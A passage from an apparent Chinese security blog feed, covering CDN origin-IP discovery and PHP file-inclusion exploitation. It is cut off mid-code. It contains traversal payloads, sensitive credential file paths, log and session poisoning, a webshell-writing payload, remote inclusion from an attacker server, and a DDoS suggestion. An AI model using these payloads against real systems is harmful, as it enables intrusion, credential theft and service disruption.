href="#3-接口安全问题" class="headerlink" title="3.接口安全问题"></a>3.接口安全问题</h3><p>调用、遍历、未授权、篡改等</p><p>调用案例：短信轰炸</p><p>遍历案例：例如水平越权遍历用户的UID来达到其他用户</p><h4 id="callback回调"><a href="#callback回调" class="headerlink" title="callback回调"></a>callback回调</h4><p><img src="image-20210803001818356.png" alt="image-20210803001818356"></p><p>可以将以上回调地址修改为跨站漏洞~</p><p>一般像callback这种含有关键字的漏洞漏洞发现可以使用burp爬虫来代替手工进行发现，当数量达到一定程度之后，在history中可以搜索关键字来进行二次复查，符合条件的可以导出，一些工具可以进行数据包二次扫描</p><p><img src="image-20210803001846351.png" alt="image-20210803001846351"></p><p><img src="image-20210803001856404.png" alt="image-20210803001856404"></p><h4 id="数据篡改"><a href="#数据篡改" class="headerlink" title="数据篡改"></a>数据篡改</h4><p>墨者靶场</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CDN绕过</title>
      <link href="/2020/06/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87/"/>
      <url>/2020/06/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1-什么是CDN"><a href="#1-什么是CDN" class="headerlink" title="1.什么是CDN?"></a>1.什么是CDN?</h2><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><h2 id="2-如何判定目标存在CDN？"><a href="#2-如何判定目标存在CDN？" class="headerlink" title="2.如何判定目标存在CDN？"></a>2.如何判定目标存在CDN？</h2><h3 id="1-超级ping-最简单"><a href="#1-超级ping-最简单" class="headerlink" title="1.超级ping-最简单"></a>1.超级ping-最简单</h3><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> 结果一致说明没有CDN</p><p>还有一种情况，网站在设置域名访问解析的时候设置了www和*前缀，这样xyz.com和<a href="http://www.xyz.com就会访问同样的站点,但是在设置cdn的时候,管理员只设置了www.xyz.com,没有设置xyz.com,所以此时ping/">www.xyz.com就会访问同样的站点，但是在设置CDN的时候，管理员只设置了www.xyz.com，没有设置xyz.com，所以此时ping</a> xyz.com就可能直接得到原站的IP</p><h3 id="2-get-site-ip-com"><a href="#2-get-site-ip-com" class="headerlink" title="2.get-site-ip.com"></a>2.get-site-ip.com</h3><p>直接输入域名即可，结果不一定准确</p><h3 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3.nmap"></a>3.nmap</h3><p>Namp -O IP,是CDN结果会提示非PC,不一定</p><h3 id="4-IP重定向主域否"><a href="#4-IP重定向主域否" class="headerlink" title="4.IP重定向主域否"></a>4.IP重定向主域否</h3><p>比如ping github</p><p><img src="image.png" alt="image"></p><p>访问ip之后会重定向到github，就证明存在CDN</p><p>![image (1)](信息收集-CDN绕过&#x2F;image (1).png)</p><p>但若直接到主域，证明该IP不是CDN</p><p>![image (2)](信息收集-CDN绕过&#x2F;image (2).png)</p><p>PS:  若找到源 IP 但它却不呈现网页</p><p>![image (3)](信息收集-CDN绕过&#x2F;image (3).png)</p><p>可以使用诸如naabu、nmap工具，扫描开放的端口</p><h3 id="5-Wappalyzer插件"><a href="#5-Wappalyzer插件" class="headerlink" title="5.Wappalyzer插件"></a>5.Wappalyzer插件</h3><p>有cdn会直接显示</p><p>![](信息收集-CDN绕过&#x2F;image (4)-1716054716524-6.png)</p><h2 id="3-绕过技术"><a href="#3-绕过技术" class="headerlink" title="3.绕过技术"></a>3.绕过技术</h2><h3 id="1-子域名查询"><a href="#1-子域名查询" class="headerlink" title="1.子域名查询"></a>1.子域名查询</h3><p>直接各查询即可网站</p><p>Dnsdb.io</p><h3 id="2-邮件服务查询"><a href="#2-邮件服务查询" class="headerlink" title="2.邮件服务查询"></a>2.邮件服务查询</h3><p>尽一切方法让对方发送邮件给你，然后查看邮件的网页源代码，里面会隐藏源站IP</p><p>例如注册账号时会发送邮件，这时就ok了</p><p>更多-&gt; 显示源信息 -&gt; 搜索(Ctrl+F) -&gt; 关键字“Received”</p><p>![image (5)](信息收集-CDN绕过&#x2F;image (5).png)</p><h3 id="3-国外地址请求-比较麻烦"><a href="#3-国外地址请求-比较麻烦" class="headerlink" title="3.国外地址请求-比较麻烦"></a>3.国外地址请求-比较麻烦</h3><p>全球很多国家地区，有可能一些地区并没有做到CDN保护，进行ping就能得到真实地址</p><p>1.Tools.ipip.net&#x2F;cdn.php</p><p>2.类似超级ping，但是是不同国家的服务器</p><p>asm.ca.com&#x2F;en&#x2F;ping.php</p><p>3.设置不同的节点进行ping</p><h3 id="4-遗留文件"><a href="#4-遗留文件" class="headerlink" title="4.遗留文件"></a>4.遗留文件</h3><p>​进行路径扫描，发现一些敏感文件，比如phpinfo.php</p><h3 id="5-扫描全网"><a href="#5-扫描全网" class="headerlink" title="5.扫描全网"></a>5.扫描全网</h3><p>​1.fofa、shodan、zoomeye搜索</p><p>​1. shodan搜索指定文件hash</p><p>​Python2代码：</p><p>​import mmh3  #安装失败要先下载安装Microsoft visual c++ 14.0</p><p>​import requests</p><p>​response&#x3D;requests.get(‘<a href="http://www.xx.com/favicon.ico">http://www.xx.com/favicon.ico</a>‘)</p><p>​favicon&#x3D;response.content.encode(‘base64’)</p><p>​hash&#x3D;mmh3.hash(favicon)</p><p>​print ‘http.favicon.hash:’+str(hash)</p><p>​然后在shodan搜索http.favicon.hash:str(hash)即可</p><p>​2.fuckcdn、w8fuckcdn、zmap</p><p>​1.w8fuckcdn-不太准</p><p>​github.com&#x2F;boy-hack&#x2F;w8fuckcdn</p><p>​2.fuckcdn</p><p>​3.zmap-环境要求比较复杂</p><h3 id="6、dns历史记录"><a href="#6、dns历史记录" class="headerlink" title="6、dns历史记录"></a>6、dns历史记录</h3><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 查询历史记录，不一定准确，有可能查询到的IP是网站之前的地址，但现在网站换了一个地方</p><p>Securitytrails.com&#x2F;domain&#x2F;<a href="http://www.baidu.com/history/a">www.baidu.com/history/a</a></p><p>Dnsdb.io</p><h3 id="7-以量打量-ddos"><a href="#7-以量打量-ddos" class="headerlink" title="7.以量打量-ddos"></a>7.以量打量-ddos</h3><p>大量数据请求将CDN的流量耗光，之后请求的就是真实网站的IP了</p><h2 id="4-如何辨别哪一个是真实的IP？"><a href="#4-如何辨别哪一个是真实的IP？" class="headerlink" title="4.如何辨别哪一个是真实的IP？"></a>4.如何辨别哪一个是真实的IP？</h2><p>以上各种方法进行查询时可能会得到不一样的结果，这时候就需要进行辨别</p><p>1.网站地区与IP所属地进行比较</p><p>网站最下端都有备案号和地区，如果此地区与其中IP所属地一致，则大致是了</p><p>总部办公地区一般也是源站地区</p><p>2.修改本地hosts文件</p><p>修改网站域名指向IP地址，如果能够正常访问，则为真（要结合方法1）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2020/06/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/06/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<hr><p>由于本人接触到的文件包含大多是php有关的，故本文是关于php文件包含。</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-产生原因"><a href="#1-产生原因" class="headerlink" title="1.产生原因"></a>1.产生原因</h3><p>服务器通过PHP的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到攻击的目的。</p><h3 id="2-相关函数"><a href="#2-相关函数" class="headerlink" title="2.相关函数"></a>2.相关函数</h3><p><code>include(),include_once(),require()和require_once()</code></p><blockquote><p>include(),include_once()在包含文件时，即使遇到错误，下面的代码依然会继续执行；</p><p>require()和require_once()则会报错，直接退出程序。</p><p>ASP：include file()、include virtual()</p><p>JSP&#x2F;Servlet：ava.io.file()、java.io.filereader()</p></blockquote><h3 id="3-检测"><a href="#3-检测" class="headerlink" title="3.检测"></a>3.检测</h3><h4 id="1-白盒测试"><a href="#1-白盒测试" class="headerlink" title="1.白盒测试"></a>1.白盒测试</h4><p>也就是代码审计</p><h4 id="2-黑盒测试"><a href="#2-黑盒测试" class="headerlink" title="2.黑盒测试"></a>2.黑盒测试</h4><p>1.漏扫工具进行扫描</p><p>2.公开漏洞进行测试</p><p>3.手工看参数值以及功能点</p><h2 id="2-文件包含分类"><a href="#2-文件包含分类" class="headerlink" title="2.文件包含分类"></a>2.文件包含分类</h2><h3 id="1-本地文件包含-LFI"><a href="#1-本地文件包含-LFI" class="headerlink" title="1.本地文件包含(LFI)"></a>1.本地文件包含(LFI)</h3><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><blockquote><p>(1)、allow_url_fopen&#x3D;On</p><p>(2)、用户可以动态控制变量</p><p>allow_url_fopen一直默认On</p></blockquote><h4 id="2-无限制本地文件包含"><a href="#2-无限制本地文件包含" class="headerlink" title="2.无限制本地文件包含"></a>2.无限制本地文件包含</h4><p>无限制本地文件包含就是指可以包含本机任意路径的文件。</p><h5 id="1-常见敏感路径"><a href="#1-常见敏感路径" class="headerlink" title="1.常见敏感路径"></a>1.常见敏感路径</h5><h6 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码(win7+没有这个文件)</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure><h6 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure><h5 id="2-包含session文件"><a href="#2-包含session文件" class="headerlink" title="2.包含session文件"></a>2.包含session文件</h5><p><strong>前提</strong>：session文件路径已知，且session文件中部分内容可控(比如知道写入的马子方便后续利用)</p><p><strong>session路径</strong>：可在phpinfo的session.save_path看到</p><p><img src="image-20210422225944645.png" alt="image-20210422225944645"></p><p><strong>默认路径</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p><p><img src="image-20210422231724653.png" alt="image-20210422231724653"></p><p><strong>利用</strong></p><p>尽力向session文件中写入你的马子！然后再进行 包含执行。</p><p><strong>栗子</strong></p><p>现在有一个session.php可控用户会话信息值</p><p><img src="image-20210422232617243.png" alt="image-20210422232617243"></p><p>可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用</p><p><img src="image-20210422232644751.png" alt="image-20210422232644751"></p><p>将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。</p><p><img src="image-20210422232707181.png" alt="image-20210422232707181"></p><p>返回结果来看，我们的payload和恶意代码已经正常解析和执行。</p><h5 id="3-包含日志"><a href="#3-包含日志" class="headerlink" title="3.包含日志"></a>3.包含日志</h5><h6 id="1-服务器日志"><a href="#1-服务器日志" class="headerlink" title="1.服务器日志"></a>1.服务器日志</h6><p><strong>条件</strong>：需要知道服务器日志的存储路径，且日志文件可读。</p><p><strong>默认路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.apache+Linux日志默认路径：/etc/httpd/logs/access*log或/var/log/httpd/access*log</span><br><span class="line"></span><br><span class="line">2.apache+win2003日志默认路径：D:\xampp\apache\log\saccess.log、D:\xampp\apache\logs\error.log</span><br><span class="line"></span><br><span class="line">3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles</span><br><span class="line"></span><br><span class="line">4.IIS7.0+win2003 默认日志文件：%SystemDrive%inet\publogs\LogFiles</span><br><span class="line"></span><br><span class="line">5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面</span><br></pre></td></tr></table></figure><p><strong>利用</strong></p><p>1.多数情况，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;下。</p><p>2.但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。</p><p><img src="image-20210422233956426.png" alt="image-20210422233956426"></p><p>3.正常的php代码已经写入了 &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log。然后包含即可执行代码。</p><p><img src="image-20210422234013004.png" alt="image-20210422234013004"></p><p>4.但有的时候，log的存放地址会被更改。这个时候可以通过读取相应的配置文件后，再进行包含。</p><p><strong>中间件默认配置文件存放路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.apache+linux 默认配置文件</span><br><span class="line"></span><br><span class="line"> /etc/httpd/conf/httpd.conf或/etc/init.d/httpd</span><br><span class="line"></span><br><span class="line">2. IIS6.0+win2003 配置文件</span><br><span class="line"></span><br><span class="line"> C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line"></span><br><span class="line">3. IIS7.0+WIN 配置文件</span><br><span class="line"></span><br><span class="line">  C:/Windows/System32/inetsrv/config/application/Host.config</span><br></pre></td></tr></table></figure><h6 id="2-SSH-log"><a href="#2-SSH-log" class="headerlink" title="2.SSH log"></a>2.SSH log</h6><p><strong>条件</strong>：需要知道ssh-log的位置，且可读。</p><p><strong>ssh日志默认路径</strong>：</p><p>1.&#x2F;var&#x2F;log&#x2F;auth.log</p><p>2.&#x2F;var&#x2F;log&#x2F;secure</p><p><strong>利用</strong>：</p><p>1.用ssh连接：</p><blockquote><p>ssh ‘<?php phpinfo(); ?>‘@remotehost</p><p>之后会提示输入密码，随便输入就可以。</p></blockquote><p><img src="image-20210422234402350.png" alt="image-20210422234402350"></p><p>2.然后利用文件包含，包含日志文件：</p><p><img src="image-20210422234416452.png" alt="image-20210422234416452"></p><h6 id="3-mysql日志"><a href="#3-mysql日志" class="headerlink" title="3.mysql日志"></a>3.mysql日志</h6><p>这个在后面的文章中有写到，就不再重复了。</p><h5 id="4-包含上传文件"><a href="#4-包含上传文件" class="headerlink" title="4.包含上传文件"></a>4.包含上传文件</h5><p>这个就是最基础的了，千变万化，在文件上传中有讲过~</p><p>大致就是上传一个文件，知道路径，再包含。。。</p><h5 id="5-包含environ"><a href="#5-包含environ" class="headerlink" title="5.包含environ"></a>5.包含environ</h5><p><strong>条件</strong>：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p><strong>默认位置</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc/self/environ</span><br></pre></td></tr></table></figure><p><strong>利用</strong>：</p><p>1.proc&#x2F;self&#x2F;environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>2.例如我们现在访问一个网站，使用burpsuite抓包，将恶意代码插入到user-agent中。</p><p><img src="image-20210425191937189.png" alt="image-20210425191937189"></p><p>3.利用文件包含漏洞去包含proc&#x2F;self&#x2F;environ，成功执行php代码。</p><p><img src="image-20210425191958665.png" alt="image-20210425191958665"></p><h5 id="6-包含临时文件"><a href="#6-包含临时文件" class="headerlink" title="6.包含临时文件"></a>6.包含临时文件</h5><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。有三种方法</p><p>由于包含需要知道包含的文件名。第一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><p>第二种方法是竞争时间去包含，参考<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></p><p>第三种方法就是结合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名。所以本节就介绍利用phpinfo页面来进行文件包含。</p><p><strong>条件</strong>：存在phpinfo页面并且存在文件包含漏洞</p><p><strong>原理</strong>：</p><ol><li>当我们给PHP发送POST数据包时，如果数据包里包含文件区块，PHP就会将文件保存成一个临时文件，路径通常为：&#x2F;tmp&#x2F;php[6个随机字符],这个临时文件，在请求结束后就会被删除。</li><li>因为phpinfo页面会将请求上下文中的所有变量打出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，就可以在返回包里找到临时文件名，也就是$_FILES变量中的内容。</li></ol><p><strong>利用</strong>：</p><p>1.首先我们使用vulhub的脚本（<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py%EF%BC%89%EF%BC%8C%E4%BB%96%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%EF%BC%8C%E8%80%8C%E8%BF%99%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%EF%BC%9A%60">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py），他可以实现包含临时文件，而这个临时文件的内容是：`</a><?php file*put*contents('/tmp/g','<?=eval($_REQUEST[1])?>‘)?&gt;<code>。成功包含这个文件后就会生成新的文件</code>&#x2F;tmp&#x2F;g&#96;，这个文件就会永久的留在目标机器上。</p><p><img src="image-20210425194218611.png" alt="image-20210425194218611"></p><p>2.写入成功以后，我们利用文件包含来执行任意命令。</p><p><img src="image-20210425194244586.png" alt="image-20210425194244586"></p><p><strong>此脚本原理</strong></p><ol><li>首先发送包含webshell的数据包给phpinfo页面，并用大量的垃圾数据将header和get等位置填满。</li><li>因phpinfo页面会将所有数据打印出来，第一个步骤中的垃圾数据就会将phpinfo页面撑的非常大。而php默认输出缓冲区大小为4096，也可以理解为php每次返回4096个字节给socket连接。</li><li>所以，这里直接操作原生socket，每次读取4096个字节。只要我们读取到字节里包含临时文件名，就立刻发送文件包含漏洞利用的数据包。因为第一个数据包的socket连接没有结束，所以临时文件还没有删除，我们就可以文件包含成功。</li></ol><h4 id="3-有限制本地文件包含"><a href="#3-有限制本地文件包含" class="headerlink" title="3.有限制本地文件包含"></a>3.有限制本地文件包含</h4><p>所谓有限制本地文件包含，就是指后台在处理文件的时候增加了安全措施，而这些措施的绕过是很麻烦的，所以简单讲一下几种最常用也是最基础的方法。</p><p><strong>%00截断</strong></p><p>条件：php &lt; 5.34，magic_quotes_gpc &#x3D; Off</p><p>在文件包含中一般情况下是因为后端代码指定了包含的文件的扩展名，因此如果想要包含任意文件我们需要截断后面的内容</p><p>后端示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;wyn&gt;&lt;?php include($_GET[&#x27;filename&#x27;] . &#x27;php&#x27;);?&gt;&lt;/wyn&gt;</span><br></pre></td></tr></table></figure><p>然后我们就可以使用payload：..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</p><p>也可以使用垃圾数据填充<code>. ./</code>，不过Windows需要点号长于256，Linux需要长于4096</p><p>也可用<code>?</code>和<code>#</code>绕过</p><p><strong>url二次编码</strong></p><p>如果后端对用户的输入进行URL解码后再包含的话（类似下面的代码），就有可能利用url二次编码来绕过前面的过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;wyn&gt;&lt;?php include(urldecode($_GET[&#x27;file&#x27;]));?&gt;&lt;/wyn&gt;</span><br></pre></td></tr></table></figure><p>我们先看一下利用的payload：<code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</code></p><p>payload先被浏览器进行一次url解码，%25对应%，此时payload变为：<code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></p><p>之后又被php进行一次url解码，%2e对应.，%2f对应&#x2F;，因此最后包含的就是<code>../../../etc/passwd</code></p><p><strong>UTF-8</strong></p><p>这个是apache tomcat的洞(好像是java的锅)，可以使用UTF-8来进行目录遍历：</p><p>受影响版本：Apache Tomcat 6.x、Apache Tomcat 5.x、Apache Tomcat 4.x</p><p>payload：%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</p><p><strong>双写等tricks</strong></p><p>有时候后端代码写的不严谨的时候，就很有可能存在绕过，比如使用str_replace()将..&#x2F;替换为空时，可以使用双写绕过：<code>..././..././..././etc/passwd</code></p><p>具体还要根据实际过滤情况来绕过</p><p><strong>路径长度截断</strong></p><p>当php &lt; 5.2.8时，可以重复使用<code>./</code>或<code>.</code>来进行截断，linux下需要长度大于4096，windows下需要大于256</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../../../../etc/passwd/./././././[...]./././././</span><br><span class="line"></span><br><span class="line">../../../../etc/passwd/..........[...]..........</span><br></pre></td></tr></table></figure><p><strong>bypass allow_url_include&#x2F;fopen &#x3D; Off</strong></p><p>该方法可以绕过<code>allow_url_include = Off</code>和<code>allow_url_fopen = Off</code>的情况，包含smb共享服务中的文件，但只适用于Windows的服务器，而且国内很多运营商都默认关闭了445端口，所以还是稍微鸡肋了点</p><p>SMB的环境搭建可以看这里：Linux SMB bypass RFI</p><p>首先在smb共享文件夹下放置你的马子</p><p>然后在本地包含smb服务的文件即可：<code>?file=\\url\phpinfo.txt</code></p><h3 id="2-远程文件包含-RFI"><a href="#2-远程文件包含-RFI" class="headerlink" title="2.远程文件包含(RFI)"></a>2.远程文件包含(RFI)</h3><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><blockquote><p>(1)、allow_url_include&#x3D;On</p><p>(2)、allow_url_fopen&#x3D;On</p><p>(3)、用户可以动态控制变量</p><p>PHP 5.2开始allow_url_include就默认为Off的，而allow_url_fopen一直默认都是On的。</p></blockquote><h4 id="2-无限制远程文件包含"><a href="#2-无限制远程文件包含" class="headerlink" title="2.无限制远程文件包含"></a>2.无限制远程文件包含</h4><p>用法：?file&#x3D;vps-ip&#x2F;ma</p><h4 id="3-有限制远程文件包含"><a href="#3-有限制远程文件包含" class="headerlink" title="3.有限制远程文件包含"></a>3.有限制远程文件包含</h4><p>绕过和有限制本地文件包含差不多</p><h3 id="3-PHP伪协议"><a href="#3-PHP伪协议" class="headerlink" title="3.PHP伪协议"></a>3.PHP伪协议</h3><p>可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。和javascript在浏览器中实现的一些的伪协议类似，PHP的伪协议提供了另一种”非常规”的方式进行数据的输入、输出。</p><p>PHP版本：&gt;&#x3D;5.2</p><p>详细解释参考官网：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><p>​<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><h4 id="file-—-访问本地文件系统"><a href="#file-—-访问本地文件系统" class="headerlink" title="file:&#x2F;&#x2F; — 访问本地文件系统"></a><a href="https://www.php.net/manual/zh/wrappers.file.php">file:&#x2F;&#x2F;</a> — 访问本地文件系统</h4><p><strong>条件</strong></p><p>1、allow_url_fopen ：off&#x2F;on 、allow_url_include：off&#x2F;on</p><p>2、必须要用绝对路径，而且可以读取文件</p><p>3、文件内容不能是php代码形式（这点要切记，非常容易犯错）否则会被直接解析。如果不是php代码的内容会被直接显示出来。</p><p><strong>用法</strong>：?file&#x3D;file:&#x2F;&#x2F;c&#x2F;boot.ini</p><h4 id="http-—-访问-HTTP-s-网址"><a href="#http-—-访问-HTTP-s-网址" class="headerlink" title="http:&#x2F;&#x2F; — 访问 HTTP(s) 网址"></a><a href="https://www.php.net/manual/zh/wrappers.http.php">http:&#x2F;&#x2F;</a> — 访问 HTTP(s) 网址</h4><h4 id="ftp-—-访问-FTP-s-URLs"><a href="#ftp-—-访问-FTP-s-URLs" class="headerlink" title="ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs"></a><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp:&#x2F;&#x2F;</a> — 访问 FTP(s) URLs</h4><h4 id="php-—-访问各个输入-输出流（I-O-streams）"><a href="#php-—-访问各个输入-输出流（I-O-streams）" class="headerlink" title="php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）"></a><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a> — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</h4><p><strong>条件</strong><br>1、不需要开启allow_url_fopen，仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。<br>2、php:&#x2F;&#x2F;filter :allow_url_fopen ：off&#x2F;on 、allow_url_include：off&#x2F;on。PHP代码读取需要编码否则直接执行php代码<br>3、常用来读取代码的包含命令 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;cmd.php<br>4、利用 php 的数据协议 data:&#x2F;&#x2F; 可以查看文件源代码，前提是 php.ini 中的 allow_url_fopen 和 allow_url_include 两个配置为 on</p><p><strong>用法</strong>：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去</p><h5 id="1-php-input-（读取POST数据）"><a href="#1-php-input-（读取POST数据）" class="headerlink" title="1.php:&#x2F;&#x2F;input （读取POST数据）"></a>1.php:&#x2F;&#x2F;input （读取POST数据）</h5><p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span 